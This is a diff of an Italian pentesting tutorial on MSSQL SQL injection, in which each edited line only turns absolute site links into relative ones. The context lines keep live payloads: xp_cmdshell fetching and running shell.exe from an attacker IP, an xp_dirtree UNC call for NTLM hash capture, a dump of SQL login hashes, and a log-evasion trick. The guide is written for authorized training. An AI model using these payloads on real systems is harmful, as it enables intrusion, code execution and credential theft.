@@ -17,7 +17,7 @@ featured: true
 
 # SQL Injection MSSQL: Identificazione, UNION, Blind, Time-Based, Stacked Query, RCE e Payload
 
-Una web app che usa MSSQL come backend e non sanifica l'input è una porta diretta verso il database — e, con la sintassi giusta, spesso anche verso il sistema operativo sottostante. Questa guida copre solo il lato web (parametri, form, header HTTP): per l'accesso diretto all'istanza via porta 1433 trovi la guida dedicata su [Pentesting MSSQL sulla porta 1433](https://hackita.it/articoli/porta-1433-mssql/).
+Una web app che usa MSSQL come backend e non sanifica l'input è una porta diretta verso il database — e, con la sintassi giusta, spesso anche verso il sistema operativo sottostante. Questa guida copre solo il lato web (parametri, form, header HTTP): per l'accesso diretto all'istanza via porta 1433 trovi la guida dedicata su [Pentesting MSSQL sulla porta 1433](/articoli/porta-1433-mssql/).
 
 **Cosa imparerai:**
 
@@ -34,7 +34,7 @@ Una web app che usa MSSQL come backend e non sanifica l'input è una porta diret
 
 | Cosa serve                                                         | Perché                                     |
 | ------------------------------------------------------------------ | ------------------------------------------ |
-| Un proxy come [Burp Suite](https://hackita.it/articoli/burp-suite/) | Per intercettare e modificare le richieste |
+| Un proxy come [Burp Suite](/articoli/burp-suite/) | Per intercettare e modificare le richieste |
 | Basi di SQL                                                        | Per capire cosa stai iniettando e perché   |
 | Ambiente di test autorizzato (HTB, lab, CTF)                       | Ogni tecnica qui è didattica               |
 
@@ -447,7 +447,7 @@ ProductID=1); WAITFOR DELAY '0:0:5';-- -
 '; IF(IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5';-- -
 ```
 
-Per automatizzare usa [sqlmap](https://hackita.it/articoli/sqlmap/) con `--technique=B --time-sec=5 --threads=1` — più thread con time-based generano falsi positivi.
+Per automatizzare usa [sqlmap](/articoli/sqlmap/) con `--technique=B --time-sec=5 --threads=1` — più thread con time-based generano falsi positivi.
 
 ***
 
@@ -554,7 +554,7 @@ Se le stacked query funzionano e sei sysadmin, puoi abilitare ed eseguire comand
 '; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.123/shell.exe C:\Windows\Temp\s.exe && C:\Windows\Temp\s.exe';-- -
 ```
 
-Per l'elenco completo di metodi alternativi (OLE Automation, Python, CLR) quando xp\_cmdshell è troppo rumoroso o disabilitato, vedi la sezione dedicata nella [guida MSSQL porta 1433](https://hackita.it/articoli/porta-1433-mssql/).
+Per l'elenco completo di metodi alternativi (OLE Automation, Python, CLR) quando xp\_cmdshell è troppo rumoroso o disabilitato, vedi la sezione dedicata nella [guida MSSQL porta 1433](/articoli/porta-1433-mssql/).
 
 ***
 
@@ -566,9 +566,9 @@ Anche senza sysadmin, una stacked query può forzare il servizio MSSQL a esporre
 '; EXEC master.dbo.xp_dirtree '\\10.10.14.123\share';-- -
 ```
 
-Cattura l'hash con [Responder](https://hackita.it/articoli/responder/) in ascolto (`sudo responder -I tun0 -v`), poi craccalo con [hashcat](https://hackita.it/articoli/hashcat/) in modalità 5600.
+Cattura l'hash con [Responder](/articoli/responder/) in ascolto (`sudo responder -I tun0 -v`), poi craccalo con [hashcat](/articoli/hashcat/) in modalità 5600.
 
-Se il firewall blocca SMB in uscita, usa l'esfiltrazione via DNS al posto di xp\_dirtree, e se l'istanza ha linked server configurati puoi attraversarli con `EXECUTE ... AT` — entrambe le tecniche, con tutti i dettagli, sono nella [guida MSSQL porta 1433](https://hackita.it/articoli/porta-1433-mssql/), perché una volta dentro il DB il resto dell'attacco non dipende più dal fatto che tu ci sia arrivato via web o via connessione diretta.
+Se il firewall blocca SMB in uscita, usa l'esfiltrazione via DNS al posto di xp\_dirtree, e se l'istanza ha linked server configurati puoi attraversarli con `EXECUTE ... AT` — entrambe le tecniche, con tutti i dettagli, sono nella [guida MSSQL porta 1433](/articoli/porta-1433-mssql/), perché una volta dentro il DB il resto dell'attacco non dipende più dal fatto che tu ci sia arrivato via web o via connessione diretta.
 
 ### Dumpare tutte le password, non solo la prima
 
@@ -582,7 +582,7 @@ Gli esempi con `TOP 1` nelle sezioni precedenti servono per confermare la tecnic
 ' UNION SELECT NULL,(SELECT name+'-'+master.sys.fn_varbintohexstr(password_hash)+' | ' FROM master.sys.sql_logins FOR XML PATH(''))-- -
 ```
 
-Il secondo payload ti dà gli hash dei login SQL Server stessi (non gli utenti dell'app) — utili per movimento laterale se riusati altrove. Il formato dell'hash cambia in base alla versione: vedi la tabella completa modes hashcat (131/132/1731) nella [guida porta 1433](https://hackita.it/articoli/porta-1433-mssql/).
+Il secondo payload ti dà gli hash dei login SQL Server stessi (non gli utenti dell'app) — utili per movimento laterale se riusati altrove. Il formato dell'hash cambia in base alla versione: vedi la tabella completa modes hashcat (131/132/1731) nella [guida porta 1433](/articoli/porta-1433-mssql/).
 
 ### Enumerare utenti di dominio via SID (senza xp\_cmdshell)
 
@@ -603,7 +603,7 @@ Il risultato è tipo `0x0105000000000005150000...0000f401`. Gli ultimi 4 byte (`
 ' UNION SELECT NULL,SUSER_SNAME(SID_BINARY(N'S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-1000'))-- -
 ```
 
-Iterando il RID da 1000 in su (i primi ID utente "regolari", non di sistema) ottieni progressivamente tutti gli username del dominio — la stessa logica RID-brute usata da `nxc mssql --rid-brute`, ma eseguita interamente tramite SQL injection, senza toccare SMB. Ogni username trovato è materiale pronto per password spray o per [Kerberoasting/AS-REP roasting](https://hackita.it/articoli/kerberos/).
+Iterando il RID da 1000 in su (i primi ID utente "regolari", non di sistema) ottieni progressivamente tutti gli username del dominio — la stessa logica RID-brute usata da `nxc mssql --rid-brute`, ma eseguita interamente tramite SQL injection, senza toccare SMB. Ogni username trovato è materiale pronto per password spray o per [Kerberoasting/AS-REP roasting](/articoli/kerberos/).
 
 ***
 
@@ -747,10 +747,10 @@ Nascondi dai log: payload--sp_password
 
 **Guide correlate su hackita.it:**
 
-* [Pentesting MSSQL: Enumerazione e Attacco sulla Porta 1433](https://hackita.it/articoli/porta-1433-mssql/)
-* [sqlmap: Guida Completa](https://hackita.it/articoli/sqlmap/)
-* [Blind SQL Injection e Automazione con Python](https://hackita.it/articoli/blind-sql-injection/)
-* [Responder: Hash Capture e NTLM Relay](https://hackita.it/articoli/responder/)
-* [Burp Suite: Intercettare e Modificare Richieste HTTP](https://hackita.it/articoli/burp-suite/)
+* [Pentesting MSSQL: Enumerazione e Attacco sulla Porta 1433](/articoli/porta-1433-mssql/)
+* [sqlmap: Guida Completa](/articoli/sqlmap/)
+* [Blind SQL Injection e Automazione con Python](/articoli/blind-sql-injection/)
+* [Responder: Hash Capture e NTLM Relay](/articoli/responder/)
+* [Burp Suite: Intercettare e Modificare Richieste HTTP](/articoli/burp-suite/)
 
 > Uso esclusivo in ambienti autorizzati.
